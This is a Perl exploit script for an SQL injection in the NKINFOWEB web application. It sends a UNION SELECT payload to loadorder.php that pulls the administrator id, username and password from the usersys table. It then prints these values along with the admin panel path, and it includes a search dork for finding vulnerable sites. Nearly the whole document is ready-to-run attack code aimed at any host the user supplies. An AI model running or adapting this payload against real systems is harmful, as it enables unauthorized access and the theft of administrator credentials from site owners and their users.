# Software Link: http://jaist.dl.sourceforge.net/project/nkinfoweb/FunctionNkinfoweb_v.species.rar
# Tested on: several linux versions

#=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

 

#!/usr/bin/perl
 use strict;
 use LWP::Simple;

print "\n";  
print "##############################################################\n";  
print "# NKINFOWEB SQL INJECTION EXPLOIT                            #\n";  
print "# Author: d4rk-h4ck3r  (Tunisian Security Team)              #\n";  
print "# Greetz to Passeword & Maxilog & all vbspiders members      #\n"; 
print "# Dork: Powered by NKINFOWEB VSp � 2009                      #\n";
print "##############################################################\n";  

 my $domain = shift @ARGV or banner();
 my $injsql ="/loadorder.php?id_sp=-17+union+select+1,2,3,concat(0x3a3a3a,id_usersys,0x3a,usersys,0x3a,pwdsys,0x3a3a3a),5,6,7,8,9,10,11+from+usersys--";

 if(get($domain.$injsql) =~ /:::(.+):(.+):(.+):::/)
 {
   print "\n[+] Exploit Succesfull!";
   print "\n[+] Admin id: : $1";  
   print "\n[+] Admin username: $2";  
   print "\n[+] Admin password: $3";
   print "\n[+] Admin panel: $domain/administrator/ ";}
 else
 {
   print "[!] Exploit Failed!\n";
   print "[!] Site Not Vulnerable!\n";
 }

 sub banner
 {
   print "[+] NKINFOWEB <= Remote SQL Injection Exploit\n";
   print "[+] Usage: ${0} http://[host]\n";
   return exit;
 }